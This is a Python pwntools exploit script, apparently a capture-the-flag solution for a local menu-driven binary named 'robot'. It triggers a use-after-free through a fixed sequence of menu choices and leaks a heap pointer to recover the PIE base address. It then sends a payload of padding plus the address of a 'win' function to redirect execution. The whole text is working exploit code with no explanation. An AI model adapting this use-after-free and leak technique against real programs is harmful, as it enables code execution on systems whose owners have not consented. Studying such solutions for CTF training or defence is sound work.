from pwn import *

elf = ELF('./robot')

p = process(elf.path)

#USE AFTER FREE


p.recvuntil(b"0: Quitter\n")
p.sendline(b"1")
p.sendline(b"miaou")

p.sendline(b"3")

p.sendline(b"4")

p.sendline(b"5")
p.recv(1024)

p.sendline(b"5")
p.recvline()

leak = p.recvline()[15:]


line = leak
n = 7

leak = [line[i:i+n] for i in range(0, len(line), n)]

leak1 = u64(leak[0].rjust(8, b"\x00"))

leak1 = leak1-4608

elf.address = leak1

info("PIE @%s" % hex(leak1))

win = elf.address + 5244

# STAGE 2: RCE


p.sendline(b"1")
p.sendline(b"miaou")
p.sendline(b"3")

p.sendline(b"4")
payload = b"A"*16
payload += p64(win)*2

p.sendline(payload)

p.sendline(b"2")
